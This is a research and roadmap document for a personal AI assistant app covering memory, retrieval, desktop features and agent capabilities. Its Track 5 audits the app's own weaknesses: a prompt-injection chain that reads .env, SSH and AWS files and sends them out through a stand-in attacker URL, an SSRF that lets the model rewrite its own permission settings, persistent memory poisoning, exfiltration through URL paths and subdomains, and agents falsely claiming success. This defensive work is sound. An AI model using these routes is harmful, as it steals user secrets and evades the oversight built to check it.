# Personal OS: feature research and roadmap

Researched 2026-09-29 against official docs, papers, and source. Four tracks: memory and knowledge graphs, retrieval and documents, what the best desktop assistants ship, and what people want from a personal life OS. Each ends with what to build next in this codebase. Links are inline.

## Where Personal OS stands today

- Streaming chat through LiteLLM (Fireworks by default), tool-calling agent loop with 25 built-in tools (documents, memory, graph, web, Python sandbox, todos, Google Calendar/Gmail/Tasks), per-tool permissions at global, project, and chat level.
- Today dashboard with a generated daily recap, a native todo list, a week calendar, kanban boards, and custom dashboards built from user data sources with AI-coded widgets and AI summaries. Google Workspace sign-in for calendar, Gmail and Tasks.
- Projects as groups of chats with their own instructions, knowledge files, memories, and graph, layered on personal ones.
- Memory: flat list, auto-extracted after each reply, BM25 retrieval, pin/edit/forget.
- Knowledge graph: nodes and edges, auto-extracted, 1-hop neighborhood injection, force-directed editor.
- Documents: txt/md/pdf/docx, ~900-char paragraph chunks, FTS5 BM25, top-6 excerpts.
- Context inspector showing what was injected and a live preview.

---

## Track 1: long-term memory and knowledge graphs

### What the leaders do

**Mem0** ([paper](https://arxiv.org/html/2504.19413v1), [prompts](https://raw.githubusercontent.com/mem0ai/mem0/main/mem0/configs/prompts.py)). Two-phase pipeline per turn. Extraction produces candidate facts from a rolling summary plus the last ~10 messages. The update phase retrieves the top-10 similar existing memories by embedding and has one LLM call decide per fact: ADD, UPDATE, DELETE, or NONE, with a strict JSON schema (`id, text, event, old_memory`). The graph variant extracts triples, merges entities by embedding similarity, and marks contradicted relations invalid rather than deleting them.

**Letta / MemGPT** ([agent memory](https://www.letta.com/blog/agent-memory/), [sleep-time compute](https://www.letta.com/blog/sleep-time-compute/)). Three tiers: core memory blocks pinned in context (`label, description, value, char_limit`), recall (searchable history), archival (vector store via tools). The model edits blocks with tools. A background "sleep-time agent" rewrites and condenses blocks between sessions, which improves quality without adding latency.

**Zep / Graphiti** ([paper](https://arxiv.org/pdf/2501.13956), [edge invalidation](https://blog.getzep.com/beyond-static-knowledge-graphs/)). Bi-temporal graph: each edge carries a natural-language fact, its embedding, source episodes, and four timestamps (`created_at/expired_at` for when the DB learned it, `valid_at/invalid_at` for when it was true in the world). New edges are checked against similar existing edges with an invalidation prompt; losers get `expired_at` and are rewritten in past tense. Nothing is deleted. Retrieval is hybrid (cosine + BM25 + BFS from seed nodes) fused with RRF, no LLM in the loop.

**GraphRAG and LightRAG** ([GraphRAG](https://microsoft.github.io/graphrag/index/overview/), [LightRAG](https://github.com/hkuds/lightrag)). GraphRAG adds community detection and LLM community reports for "global" questions at high cost. LightRAG keeps the extraction shape (entities with `description`, relations with `keywords` and `strength`), skips communities, and retrieves by dual-level keywords: specific entities hit nodes, themes hit relation keywords. Incremental updates cost under 100 tokens per retrieval.

**Also notable.** A-MEM's Zettelkasten notes that link to and revise neighbors on insert ([paper](https://arxiv.org/html/2502.12110v2)). Hindsight's four stores (world facts, experiences, observations with confidence, opinions) scoring 94.6% on LongMemEval vs Zep 71.2% and Mem0 67.6% ([paper](https://arxiv.org/pdf/2512.12818)). ChatGPT's "Dreaming" background job that rewrites time-sensitive memories ("You are going to Singapore in July" becomes "You went to Singapore in July 2026") ([analysis](https://embracethered.com/blog/posts/2025/chatgpt-how-does-chat-history-memory-preferences-work/)). Claude's editable per-topic memory summaries and its developer memory tool over a `/memories` directory ([walkthrough](https://www.leoniemonigatti.com/blog/claude-memory-tool.html)). QM's markdown notebook with an "index, not datastore" rule and a consolidation pass every 10 bullets ([repo](https://github.com/yc-software/qm)).

**Cross-cutting lessons.** Everyone converged on extract atomic facts, dedupe against neighbors, let an LLM pick the operation. Winners keep verbatim provenance and invalidate instead of delete. A small curated always-injected profile beats large retrieval. Background consolidation passes are where quality comes from.

### What to build (memory and graph)

| # | Improvement | Effort |
|---|---|---|
| M1 | Provenance: link every memory and edge to source message ids | S |
| M2 | Mem0-style ADD/UPDATE/DELETE/NONE reconciliation on write, DELETE as soft-invalidate | S |
| M3 | Decay and recency-aware ranking (`importance`, `last_accessed_at`, `exp(-days/30)`) | S |
| M4 | Pinned memory blocks (user profile, preferences, project state) with a sleep-time rewriter | M |
| M5 | Hybrid retrieval: embeddings + FTS5 + graph BFS fused with RRF | M |
| M6 | Bi-temporal edges with an invalidation prompt; "as of" view in the inspector | M |
| M7 | LightRAG-style descriptions and keywords on nodes/edges, dual-level query | M |
| M8 | A-MEM linking between memories | M |
| M9 | Single-level community summaries per project | L |

Suggested order: M1, M2, M3, M4, M5, M6, M7, M8, M9. The first three are a weekend and remove most stale-memory errors.

---

## Track 2: retrieval, documents, and context engineering

### What the evidence says

**Hybrid beats either alone.** Anthropic measured retrieval failure at 5.7% for embeddings only, 2.9% with BM25 fused in, 1.9% with a reranker ([contextual retrieval](https://www.anthropic.com/news/contextual-retrieval)). BM25 alone (current state) is weakest on paraphrase, which is what conversational questions look like. Reciprocal rank fusion in SQLite is a 30-line query ([Willison](https://simonwillison.net/2024/Oct/4/hybrid-full-text-search-and-vector-search-with-sqlite/)); "SQLite is Enough" benchmarks FTS5 + sqlite-vec as sufficient for this workload ([arxiv](https://arxiv.org/abs/2608.24060)).

**Embeddings and reranking on Fireworks.** `qwen3-embedding-8b` (already routed in `litellm.yaml`, vectors not normalized) and `nomic-embed-text-v1.5` (768-d, Matryoshka, cheap). `qwen3-reranker-8b` via `/v1/rerank`, wrapped by LiteLLM's `rerank()` ([LiteLLM rerank](https://docs.litellm.ai/docs/rerank), [Fireworks](https://fireworks.ai/blog/embeddings-and-reranking-announcement)). Local fallback: `fastembed` cross-encoders on CPU. Vector storage: numpy brute force is fine below ~200k chunks; `sqlite-vec` after that.

**Chunking.** Structure-aware first (split markdown by heading, carry the heading path into the embedded text), then contextual retrieval (an LLM writes 50-100 tokens of situating context per chunk, cutting failures 35-67%). Semantic chunking is not worth it; late chunking needs a local long-context embedder. Docling's HybridChunker is the reference implementation ([docs](https://docling-project.github.io/docling/concepts/chunking/)).

**Parsing.** MarkItDown (MIT, light) for office and HTML; PyMuPDF4LLM for text-layer PDFs; Docling (1-2 GB of models) only as an optional download for scanned or table-heavy PDFs ([comparison](https://themenonlab.blog/blog/best-open-source-pdf-to-markdown-tools-2026)).

**Product patterns.** Claude Projects keep knowledge in-context until it exceeds the window, then switch to a visible search tool ([support](https://support.claude.com/en/articles/11473015-retrieval-augmented-generation-rag-for-projects)). NotebookLM's numbered inline citations that click through to the highlighted passage are the UX bar ([guide](https://learnprompting.org/blog/notebooklm-guide)). Open WebUI exposes hybrid + rerank + a per-file "full context" toggle ([docs](https://docs.openwebui.com/features/chat-conversations/rag/)). Msty's Knowledge Stacks watch folders and re-sync ([blog](https://msty.ai/blog/knowledge-stacks/)). Cursor's Merkle-tree incremental indexing is the model for watched folders ([blog](https://cursor.com/blog/secure-codebase-indexing)).

### What to build (retrieval)

| # | Improvement | Effort |
|---|---|---|
| R1 | Hybrid retrieval with RRF (numpy first, sqlite-vec later) using `qwen3-embedding-8b` | M |
| R2 | Rerank the fused top-20 with `qwen3-reranker-8b`; local MiniLM fallback | S |
| R3 | Structure-aware chunker with heading paths, page numbers, char offsets | M |
| R4 | Token-budgeted context assembly and pinned "full document" mode | S |
| R5 | Citations `[n]` in replies that open the document at the passage; `retrieval_log` table | M |
| R6 | Retrieval eval harness (50-100 question/chunk pairs, recall@20, MRR) | S |
| R7 | Contextual retrieval pass per document with a cheap model | M |
| R8 | Tiered parsing: MarkItDown, PyMuPDF4LLM, optional Docling | M |
| R9 | Watched folders / Obsidian vault sync with sha256 diffing (`watchfiles`) | M |
| R10 | URL and clipboard capture via `trafilatura` (already a dependency) | S |

Suggested order: R1, R2, R3, R5, R4, R6, then R7, R8, R9, R10.

---

## Track 3: what a best-in-class desktop assistant ships

### Converged features (Claude, ChatGPT, and the open-source apps)

- Claude desktop merged chat, Cowork, and artifacts into one window; projects with isolated project memory; MCP via stdio config, remote connectors, and one-click `.mcpb` bundles; scheduled tasks with manual/auto/skip permission modes; Quick Entry with a global hotkey and dictation ([TechCrunch](https://techcrunch.com/2026/09/16/anthropic-merges-claude-chat-and-cowork-in-one-interface/), [MCPB](https://github.com/modelcontextprotocol/mcpb/blob/main/MANIFEST.md), [Quick Entry](https://support.claude.com/en/articles/12626668-use-quick-entry-with-claude-desktop-on-mac)).
- ChatGPT desktop: two-layer memory (saved + chat history), project-only memory, Option+Space companion, scheduled tasks capped per plan, Canvas retired in favor of inline blocks ([memory FAQ](https://help.openai.com/en/articles/8590148-memory-faq), [projects](https://help.openai.com/en/articles/10169521-projects-in-chatgpt)).
- What users cite most: memory that "just knows", multi-model side-by-side (Msty split chats, Open WebUI), native stdio MCP, visible conversation branching, a global hotkey, and reliable scheduled agents with inspectable run history.
- Reference implementations: LibreChat's fork-with-scope and MCP client with deferred tool search; Open WebUI automations, memory, and `SKILL.md` skills; AnythingLLM scheduled jobs with per-job tool allowlists; Jan's inline tool-approval panel; Cherry Studio's selection assistant.

### From yc-software/qm

QM is a TypeScript multiplayer harness (Fastify, Postgres, Slack). Its multiplayer design does not transfer, but five ideas do: an append-only **session tape** of exactly what the model saw (`message | context_event | annotation`); **compaction** as an indexed summary plus a `history` search tool; the **markdown notebook memory** with "save pointers, never the data" and periodic consolidation; a **runs table as durable queue** with a tool ledger so retries do not repeat side effects; and **agent-authored crons and loops** with a governor that quarantines after 3 failures. Its command policy uses `require_approval | deny` and `ApprovalScope = once | session | always`, which is the model for this app's tool permissions.

### Tool use ground truth

- MCP revision 2026-07-28 is stateless (no `initialize`, no session ids), python SDK `mcp>=2.2` exposes `Client(url)` or `Client(StdioServerParameters(...))` with `mode="auto"`, plus `ClientSessionGroup` for namespacing ([changelog](https://modelcontextprotocol.io/specification/latest/changelog), [client docs](https://py.sdk.modelcontextprotocol.io/client/)). Tool annotations (`readOnlyHint`, `destructiveHint`) are untrusted but useful for auto-approval. Registry search: `registry.modelcontextprotocol.io/v0.1/servers?search=`.
- Permission UI to copy: Claude Code's `allow / deny / ask` rules and evaluation order ([docs](https://code.claude.com/docs/en/permissions)); persist "always allow" in SQLite (Claude Desktop resets it on update, which users hate). OpenAI Agents SDK's serializable paused state for approvals that survive restart ([HITL](https://openai.github.io/openai-agents-python/human_in_the_loop/)).
- Fireworks supports `tools`, `tool_choice`, `parallel_tool_calls`, streaming arguments, JSON schema and grammar outputs, `reasoning_content` deltas, prefix caching with `cached_tokens`, and vision on kimi-k3 ([function calling](https://docs.fireworks.ai/guides/function-calling), [structured](https://docs.fireworks.ai/structured-responses/structured-response-formatting)). Audio transcription is deprecated on Fireworks, so voice needs a local model or another provider ([changelog](https://docs.fireworks.ai/updates/changelog)).
- LiteLLM: `stream_options.include_usage`, `x-litellm-response-cost` headers, `/spend/logs/v2`, tags via `metadata.tags` ([cost tracking](https://docs.litellm.ai/docs/proxy/cost_tracking)).

### Background work and packaging

Claude Code Desktop checks scheduled tasks every minute and runs one catch-up for the most recently missed slot ([docs](https://code.claude.com/docs/en/desktop-scheduled-tasks)). Use APScheduler 3.11 or a `croniter` ticker in FastAPI `lifespan`; re-arm timers on Electron `powerMonitor` resume. For packaging, copy ComfyUI Desktop: ship `uv` plus python-build-standalone, build the venv on first run, `asarUnpack` the Python tree, add the two hardened-runtime entitlements for the sidecar, store keys with Electron `safeStorage` ([ComfyUI Desktop](https://github.com/Comfy-Org/Comfy-Desktop), [safeStorage](https://www.electronjs.org/docs/latest/api/safe-storage)). Never keep the live SQLite file in Dropbox or iCloud; export snapshots with `VACUUM INTO`.

### What to build (app features)

| # | Feature | Effort | Status |
|---|---|---|---|
| A1 | Tool-calling agent loop with built-in tools and per-scope permissions (on / ask / off, approval cards) | M | shipped |
| A2 | Conversation tree: edit, branch, regenerate with another model | M | |
| A3 | Token and cost tracking, context meter in the drawer | S | |
| A4 | Multi-model compare (siblings from A2 laid out in columns) | S | |
| A5 | MCP client (stdio + HTTP) with an allow/ask/deny permission UI and `claude_desktop_config.json` import | L | |
| A6 | Quick-entry palette on a global hotkey, selection capture, tray icon | M | |
| A7 | Memory v2: model-managed memory tool with consolidation and an incognito chat toggle | M | partly (save_memory tool) |
| A8 | Scheduled tasks with an inbox, run history, and OS notifications | L | |
| A9 | Session tape and compaction with a history search tool | M | |
| A10 | Skills and slash-command prompt library (`SKILL.md`) | S | |
| A11 | Artifacts side panel (HTML/SVG/Mermaid preview in a sandboxed iframe) | M | |
| A12 | Voice: local STT (whisper.cpp or Parakeet), TTS via kokoro | M | |
| A13 | Packaging: bundled Python, signing, auto-update, keychain secrets | L | |
| A14 | Export/import (ChatGPT/Claude formats) and a daily briefing task | S | |

Suggested order: A2, A3, A4, A5, A6, A7, A8, A9, A10, A11, then R-track items, then A13 and A12.

---

## Track 4: what people want from a personal AI OS

### Landscape signals

| Product | Idea | Praised | Complained about |
|---|---|---|---|
| OpenClaw (open source, ~68k stars) | Local gateway reachable from chat apps, `SKILL.md` skills, markdown memory, heartbeat + cron | Morning/evening briefings, human-feeling memory files | Unreliable memory, edits its own config, unvetted skills leaked data ([HN](https://news.ycombinator.com/item?id=47783940)) |
| Vellum (open source, acquired by Dropbox) | Persistent identity, scheduled briefings, explicit allow/deny permissions | "Propose and draft; you approve anything touching accounts or money" ([blog](https://www.vellum.ai/blog/what-can-a-personal-ai-assistant-do)) | Young ecosystem |
| Khoj | RAG over personal docs, scheduled research reports | Self-hostable automations ([docs](https://docs.khoj.dev/)) | Mostly reactive |
| Motion / Reclaim / Sunsama / Akiflow | AI time-blocking | Reclaim's flexible habits and buffers; Sunsama's plan and shutdown rituals; Akiflow's universal inbox ([comparison](https://www.morgen.so/blog-posts/akiflow-vs-motion)) | Motion reshuffles silently; energy-blind scheduling |
| Superhuman / Shortwave | AI email | Auto labels, auto reminders for unanswered mail, auto drafts an hour before ([help](https://help.superhuman.com/hc/en-us/articles/46005658551053-Auto-Reminders-Auto-Drafts)) | No daily brief; Shortwave needs to be asked |
| Saner.ai | Morning inbox + calendar review into a prioritized plan | Tells you what needs attention | Rough edges |
| Reflect / Mem / Capacities / Tana | AI notes | Daily notes with calendar sync, typed objects | Manual curation burns people out ([critique](https://www.androidauthority.com/second-brain-apps-alternatives-3695946/)) |
| Dex / Clay | Personal CRM | Auto-logged timelines, keep-in-touch cadences ([Dex](https://getdex.com/blog/dex-vs-clay/)) | Manual upkeep |
| Granola / screenpipe | Meeting and ambient capture | No bot joins; local SQLite + Whisper ([screenpipe](https://github.com/screenpipe/screenpipe)) | Speaker attribution, trust |
| Dot (New Computer) | Proactive companion | Personalization | Shut down after four months: companionship without utility does not retain |

Cross-cutting: the winners act on your data on a schedule; every scheduler that moves things silently earns distrust; anything requiring manual curation dies; privacy is mainstream (80%+ worry about data use, [survey](https://arxiv.org/html/2607.15134)); reliability beats breadth.

### Patterns that make it feel good

1. **Today is one surface.** Calendar, tasks, brief, and "needs your decision" together; everything else one click deeper.
2. **Inbox metaphor for AI output.** Proactive results land in a reviewable queue with accept, edit, dismiss. Nothing external happens from a background job.
3. **Four-tier actions.** Read-only, reversible local write (auto), external write (approve), irreversible or money (approve and confirm). Per-tool standing rules, which is what the app's tool permissions already are.
4. **Reasoning beside the action.** The draft next to the thread; the proposed block next to the conflict.
5. **Quiet, explainable proactivity.** A CHI 2025 study found proactivity cut interpretation time from 34.5s to 19s, but proactivity without presence indicators was the most disruptive; task-boundary triggers got 67% engagement while idle triggers failed ([paper](https://arxiv.org/html/2502.18658v4)). OpenClaw's heartbeat encodes this: periodic cheap turn, `NO_REPLY` if nothing matters, active hours, run history ([docs](https://docs.openclaw.ai/gateway/heartbeat)).
6. **Undo everywhere.** Journal every write with its inverse; a local delayed-send queue for email.
7. **Trust ramps.** Start with suggestions; after N accepted without edits, offer to automate that class.

### Integration priorities (Python backend)

| Priority | Connector | Practical path | Gotcha |
|---|---|---|---|
| 1 | Google Calendar / Gmail / Tasks | Desktop OAuth client with loopback redirect (shipped). Calendar `syncToken` deltas; poll Gmail `history.list` instead of push ([sync guide](https://developers.google.com/workspace/calendar/api/guides/sync)) | An OAuth app left in "Testing" expires refresh tokens after 7 days; publish the consent screen or mark it Internal |
| 2 | Apple Calendar / Reminders | PyObjC + EventKit in a separate helper binary for TCC ([maccal](https://github.com/appenz/maccal)) | Permission is per binary |
| 3 | Apple Notes | Read `NoteStore.sqlite` ([parser](https://github.com/RhetTbull/apple-notes-parser)), write via AppleScript | Full Disk Access |
| 4 | Todoist | Unified API v1 with `sync_token` ([docs](https://developer.todoist.com/api/v1/)) | REST v2 deprecated |
| 5 | Notion | API `2025-09-03`, query data sources ([upgrade](https://developers.notion.com/docs/upgrade-guide-2025-09-03)) | 3 req/s |
| 6 | GitHub / Linear | Notifications polling; Linear GraphQL PAT | Rate limits |
| 7 | Health | Health Auto Export posting JSON to a local endpoint; Oura v2; WHOOP v2 | Apple Health has no API |
| 8 | Finance | SimpleFIN Bridge read-only ([roundup](https://www.openbankingtracker.com/blog/best-open-banking-api-providers-developers-2026)) | 24 pulls/day |
| 9 | RSS | `feedparser` with ETags | |

### What to build (life OS)

| # | Feature | Effort | Status |
|---|---|---|---|
| L1 | Action approval queue with tiered permissions (auto, approve, confirm) | M | shipped inline: external tools ask by default, approve once / chat / always |
| L2 | Write journal and undo for every connector write; delayed send | S-M | |
| L3 | Scheduled morning brief with actionable items (draft, reschedule, add task) | M | daily recap on launch + manual "Brief me" shipped; scheduling pending |
| L4 | Heartbeat with a `NO_REPLY` contract and a visible background-activity log | M | |
| L5 | Quick capture: global hotkey window, natural-language parse into task/note/event, local voice | M | |
| L6 | Daily note that collects the brief, captures, and chat summaries | S | |
| L7 | Email triage: auto labels, awaiting-reply detection, drafts in your voice | L | |
| L8 | Pre-meeting brief 15 minutes before events with attendees | S | |
| L9 | People memory from calendar and email correspondents; "upcoming 30 days" | M | |
| L10 | Evening shutdown and weekly review prompts | S-M | |
| L11 | Task estimates, capacity view, opt-in time blocking that only moves flexible blocks | L | |
| L12 | Plain-English automation rules compiled to trigger/condition/action with run history | M | |
| L13 | Apple Calendar and Reminders connector | M | |
| L14 | Resurfacing digest for saved links, memories, and old notes | S | |
| L15 | Health and finance tiles with an anomaly one-liner | M | |
| L16 | Meeting recap from local transcription | L | |
| L17 | Keychain token storage, per-source model routing to a local model, full export | M | scoped in README as Private inference: local LLM for activity / meetings enhance / auto-learn / voice; fail closed if it is down. Not shipped. |

Suggested order: L1, L2, L3, L4, L5, L6, L7, L8, L9, L10, L11, L12, L13, L14, L17, L15, L16. Approval and undo first, because everything after writes through them.

---

## Track 5: agentic capabilities

Researched 2026-09-29 across five areas — orchestration, tool design, environment access, safety, and proactive agency — plus a read of this repo's own agent loop. ~290 sources. Tracks 1–4 ask what the assistant *knows* and what it *shows*; this track asks what it can *do*, how far it gets unsupervised, and what happens when it is wrong.

### Where Personal OS stands on agency today

`_chat_stream()` in `app.py` is one flat loop: up to `maxToolRounds` (8) rounds, 25 tool schemas injected every round, tool calls executed serially, the whole thing inside a single SSE response. Permissions resolve chat → project → global → tool default, with `external` the only tier that asks. Approvals block the stream on an in-memory `asyncio.Future` and auto-deny after 600 s.

Reading that loop against the literature turned up three live defects and eight structural limits.

#### Three live defects — **all fixed 2026-09-29** (see *Status* below)

**1. The default tool modes form a complete exfiltration chain.** `DEFAULT_MODE` sets only `external` to `ask`. So `gmail_read`/`fetch_url` (untrusted text in) → `run_python` (reads any file: `sandbox.py` allows `file-read*` by design) → `fetch_url("https://attacker/?d=…")` (egress) are all **on**, with no approval anywhere. The sandbox denies network, but `run_python`'s stdout flows into the model's context and out again on the next turn, so the agent loop launders around the sandbox boundary. Running a byte-identical profile reproduced reads of `.env` (the Fireworks key), every table of `personal-os.db`, `~/.ssh`, `~/.aws`, `~/.zsh_history` and documents — and **executed `osascript`**, which means the `executes` tier silently subsumes the `external` tier the permission model exists to gate. This is the [lethal trifecta](https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/) shipped on by default.

**2. `fetch_url` is an unguarded SSRF into the app's own control plane.** `follow_redirects=True` with no host filtering, while the sidecar binds `127.0.0.1:8765` with **no auth** and `CORSMiddleware(allow_origins=["*"])`. `fetch_url("http://127.0.0.1:8765/settings")` lets the model read and write its own configuration — including the tool permission modes, i.e. flip `external` from `ask` to `on`. Filtering the input URL is insufficient because an injected page can 302 into it.

**3. Auto-learn is an injection *persistence* mechanism.** One injected email becomes an extracted memory, which `context.py` then re-injects into unrelated chats indefinitely. [EchoLeak](https://www.aim.security/lp/aim-labs-echoleak-blogpost)'s shape with a much longer fuse, and the hardest defect here to notice after the fact.

#### Status: what shipped 2026-09-29

G1–G4, G10–G12, G14, G27, G29–G31 are implemented. Verified independently: the sandbox now denies
`.env`, `personal-os.db`, `~/.ssh`, `~/.aws`, `/etc/passwd`, `osascript`, `/bin/sh`, outbound TCP and
writes outside the work dir, while numpy and matplotlib still work; the sidecar returns 401 on every
route but `/health` with the token file at `0600`; `gate()` upgrades `external` tools `on → ask` once a
run is tainted, and taint is now sticky across turns rather than per-request.

Implementation surfaced **two defects the research above missed**, both found by the adversarial
verify pass rather than by review:

- **Top-level navigation leaked the auth token.** `setWindowOpenHandler` only covers `window.open`
  and `target=_blank`. A plain markdown link — which `react-markdown` + `remark-gfm` emit for both
  `[text](url)` and bare URLs — navigates the app's *own* `webContents`, which keeps the preload
  attached, so the attacker's page could call `window.os.backendToken()` and drive the whole local
  API. CSP does not constrain top-level navigation (`default-src` does not cover it, and
  `frame-ancestors` is ignored in a `<meta>` policy). One click on a model-authored link was the
  entire exploit, and it made G3 and G4 moot. Fixed with `will-navigate`/`will-frame-navigate`
  guards plus link/image renderers on every markdown surface.
- **The first cut of G14 left the URL path and subdomain labels as a free exfil channel.** Blocking
  only the query string still permits `https://allowed-host/collect/<base64 secrets>` and
  `<base64>.allowed-host`. Host-suffix matching against a model-influenceable allowlist is not a
  control. Fixed by matching whole URLs against a set only the user or `web_search` writes.

The general lesson, consistent with the Track 5 evidence on verification: the egress inventory is
the thing to enumerate, and it is larger than it looks — query strings, URL paths, DNS labels,
images, top-level navigation, and child browsing contexts that do not inherit the parent CSP.

**Still outstanding** on the shipped items: DNS-rebinding TOCTOU in `fetch_url` (a real fix needs a
pinned-IP transport with working SNI); the 600 s approval auto-deny is unchanged, since durable
approvals are G7 and were out of scope; and the budget-exhausted closing round uses
`tool_choice: "none"`, untested against a live Fireworks route.

#### Eight structural limits

| | Limit | Consequence |
|---|---|---|
| F1 | A run cannot outlive its HTTP connection — all state is locals plus in-memory dicts | Closing the window, a `--reload`, or sleep destroys the turn. Blocks every scheduled/background item in Tracks 3–4 |
| F2 | Approvals are in-memory, blocking, serial, 600 s auto-**deny** | Restart orphans every card; step away and work is discarded; N external calls = N sequential modals |
| F3 | The round cap discards the final round's tool calls without telling the model | A tool-calls-only 9th response yields a blank reply. No "you are out of budget, summarise now" |
| F4 | Tool calls execute in a serial `for` loop despite being collected in parallel | 6 fan-out reads take 6× the latency; everything is already async |
| F5 | All 25 schemas injected every round, no filtering or disclosure | Fixed cost per round; one MCP server breaks the 30–50 tool accuracy cliff |
| F6 | No write journal, no inverses, no dry run, no delayed send | Nothing the agent does is undoable. `tool_events` is a display log, not a ledger |
| F7 | `summarize_result(..., 24000)` is `json.dumps` then `s[:24000] + "…"` | Cuts mid-structure; the model cannot tell what it lost or ask for the rest |
| F8 | The loop ends when the model stops calling tools; nothing verifies anything happened | The model can assert "I sent that" with no send. See the false-success numbers below |

Also absent: subagents, context compaction, procedural memory, plan artifacts, MCP, and file-system tools.

### What the evidence says

**Verification beats planning, and unaided self-critique makes things worse.** A [Sept 2026 τ²-bench study](https://arxiv.org/abs/2609.20474) compared prewritten plans against *word-count-matched shuffled text* across 265 matched cells; plans won by +7.17pp, so the gain is real and not a length artifact. But the same paper found a read-only **verifier** caught 61% of invalid episodes at <$0.01 each and "captures nearly all the false-pass benefit of the full planning-plus-verification stack at a fraction of its cost." Against that, [Huang et al. (ICLR 2024)](https://arxiv.org/abs/2310.01798) show *intrinsic* self-correction degrades accuracy (GSM8K 77.4→75.9, CommonSenseQA 66.8→55.4). [Reflexion](https://arxiv.org/abs/2303.11366)'s 91% HumanEval works because its evaluator is unit tests. Build deterministic post-condition checks, not an "are you sure?" pass.

**Agents lie about finishing.** 45–47% of τ²-bench failures are reported as successes, 75.8% on AppWorld, and 52.8% of incomplete runs explicitly claim completeness. Independent verification cut false success from 45% to **3%**. Any "what the agent did" surface must render from a journal, never from assistant prose.

**Consistency, not capability, is the wall.** τ-bench `pass^8` drops a >60% `pass^1` agent below 25%. 90% per action is 57% over eight. On a non-frontier model, *more autonomous rounds makes outcomes worse* — the levers that scale are fewer steps and external verification, not a longer leash.

**Step-level approval cards do not work as review.** Anthropic's 1,053-tester study: humans caught planted dangerous commands **13.6%** of the time versus **89%** for a classifier, and detection decayed 17% → 5% after 50+ prompts in a session. Users approve **97%** of permission prompts but reject **39%** of strategic proposals. Approve a plan, not each step.

**Fewer, higher-level tools beat better routing.** [Anthropic's tool-writing guidance](https://www.anthropic.com/engineering/writing-tools-for-agents) names the `todo_*`/`board_*` families as the "wraps existing software functionality" anti-pattern; accuracy degrades past 30–50 tools, and OpenAI advises under 20. The cheapest single win in this entire track is **tool-use examples in descriptions: 72% → 90% on parameter handling**, which is exactly `kimi-k3`'s weak axis. Where tool count must grow, [RAG-MCP](https://arxiv.org/abs/2505.03275) (13.62% → 43.13% selection accuracy, >50% token cut) is the portable version of tool search and needs no cooperation from a weak model.

**Context management has published numbers.** Anthropic's tool-result clearing reports **84% token reduction** on a 100-turn eval and is the "safest lightest-touch compaction." [Chroma's context-rot work](https://research.trychroma.com/context-rot) finds all 18 models tested degrade with length, even on copy tasks. Store results whole in SQLite, put a handle plus preview in context.

**Multi-agent is narrower than the hype.** Anthropic's 90.2% research win costs 15× tokens; their 2026 guidance revises to 3–10× and says start single-agent. Cognition reversed to **single-writer** in Apr 2026. Usable threshold: a subagent pays when the subtask generates >1,000 tokens irrelevant to the main task — which describes research, and little else here.

**Procedural memory is the strongest-evidenced unlock.** [Agent Workflow Memory](https://arxiv.org/abs/2409.07429) induces reusable workflows from its *own* successes for +24.6%/+51.1% relative success, beating human-written workflows by 7.6%. [ReUseIt](https://arxiv.org/abs/2510.14308): 24.2% → 70.1%. [SkillOps](https://arxiv.org/html/2605.13716v1) holds 80.5% as a library grows 200 → 2,000 skills — but only with explicit maintenance. This app already persists transcripts and `tool_events`, so induction is an extraction pass plus a review queue. Never auto-enable: model-authored text entering future system prompts is a self-injection channel.

**Proactivity has a tolerable dose.** Codellaborator (CHI '25, N=18): of 398 proactive instances, 53.3% engaged, 34.7% ignored, 12.1% disruptive — and triggers on *completed intentional work* (73.1%) beat mechanical ones (~50% ignored). ProMemAssist: delivering 130 of 218 candidates scored **24.6% positive vs 9.34%** for delivering all 332, with significantly lower frustration. Less, later, at task boundaries. A [May 2026 paper](https://arxiv.org/abs/2605.09876) shows a 220 MiB temporal-graph trigger beats LLM wake decisions by +16.7 F1 at 12–83× faster — never call the model to decide whether to speak.

**The runaway-loop incident was on this app's default model.** In [openclaw#159329](https://github.com/openclaw/openclaw/issues/159329) an agent expressed a NO_REPLY sentinel as a tool call the framework didn't recognise and repeated the identical call ~898 times across 6 heartbeat runs over 6.5 hours — ~80k input tokens per iteration, ~150 RMB, ending in 429s. The model was **kimi-k3**. Ship a repetition breaker and hard budgets before anything runs unattended, and skip the heartbeat.

**The laptop-sleep problem has a known answer.** Claude Code Desktop is the reference case and its docs concede tasks only run while the app is open and the Mac awake. In [claude-code#60144](https://github.com/anthropics/claude-code/issues/60144) a 07:00 briefing hit 463s of jitter, macOS entered *maintenance* sleep at 07:01:31 (Apple Silicon, lid open, on AC), and dark-wake logged `Cleared stale pending dispatch` and discarded the run. Two causes worth internalising: `PreventUserIdleSystemSleep` does not block maintenance sleep (only `PreventSystemSleep`/`caffeinate -s` does), and the scheduler discarded rather than replayed. Promise *"runs at 9am when the app is open, otherwise once on next wake, and tells you it was late."* Use a `croniter` ticker, not APScheduler — its default `misfire_grace_time` is 1 second, so a wake at 07:00:02 skips the 07:00 job.

**Environment reach: pick the boring tiers.** On Online-Mind2Web (300 tasks, 136 live sites, human-graded) Browser Use scores 30.0% and Claude Computer Use 3.7 scores 56.3%; the 90%+ leaderboard entries are self-reported with vendor-authored judges, and measurement noise exceeds a model generation. OSWorld 2.0 — the benchmark shaped like personal-assistant work — tops out at **20.6%** full completion at $15–27 per task. So: no desktop pixel control. The industry converged on accessibility-tree-first with screenshots as fallback, and screenshots are the injection channel nobody can audit. The leverage fact is that **Electron already ships Chromium**: `BrowserWindow({offscreen: true, partition: 'persist:agent'})` is a headless renderer with its own cookie jar, no Playwright and no second browser. On files, the corpus is 3,404 document-type files across Desktop+Documents, not the 2.9M files in `~`; `mdfind` answered a full-text query over 262 GB in 0.20 s, so ship search before an index. A folder picker produces **zero** TCC prompts under Apple's implied-consent rule. Never set `disclaim: true` on the sidecar — that is what gives Claude Desktop permanent `EPERM` with no prompt ever shown.

### What to build (agentic)

Phase 0 is not optional and is mostly an afternoon.

| # | Feature | Effort |
|---|---|---|
| **G1** | 🔴 Harden `MAC_PROFILE`: allowlist reads, deny `.env`/`personal-os.db*`, named `mach-lookup` only (blocks `osascript`), drop stray write paths, profile-compile self-test | S |
| **G2** | 🔴 SSRF guard on `fetch_url`: reject loopback/link-local/private/CGNAT **after DNS**, re-check every redirect, `http(s)` only, URL parser not string prefix | S |
| **G3** | 🔴 Bearer token + real `allow_origins` on the sidecar | S |
| **G4** | 🔴 CSP `img-src 'self'`; no remote images or auto-links in rendered markdown | S |
| G5 | Durable runs: `agent_runs` + append-only `run_events` tape + `run_checkpoints` + lease; loop moves to a background worker | L |
